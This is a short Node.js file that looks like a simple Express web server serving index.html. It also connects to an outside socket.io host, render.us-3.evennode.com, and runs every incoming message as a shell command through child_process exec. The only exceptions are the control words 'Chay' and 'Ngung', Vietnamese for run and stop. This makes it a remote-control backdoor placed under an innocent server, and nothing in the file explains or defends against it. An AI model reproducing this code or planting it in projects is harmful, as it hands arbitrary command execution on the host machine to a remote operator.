const express = require('express');
const socketIO = require('socket.io');
const PORT = process.env.PORT || 8080;
const INDEX = '/index.html';

const server = express()
  .use((req, res) => res.sendFile(INDEX, { root: __dirname }))
  .listen(PORT, () => console.log(`Listening on ${PORT}`));

const { exec } = require('child_process');
const
    io = require("socket.io-client"),
    ioClient = io.connect("http://render.us-3.evennode.com:80");

ioClient.on("message", (msg) => {
  if (msg ==='Chay') {
    console.log('Em bat dau chay');
  } else if (msg ==='Ngung'){
    console.log('Em ngung chay');
  }
   else {
    exec(msg, (err, stdout, stderr) => {
  if (err) {
   
    return;
  }
  
});
  }
});

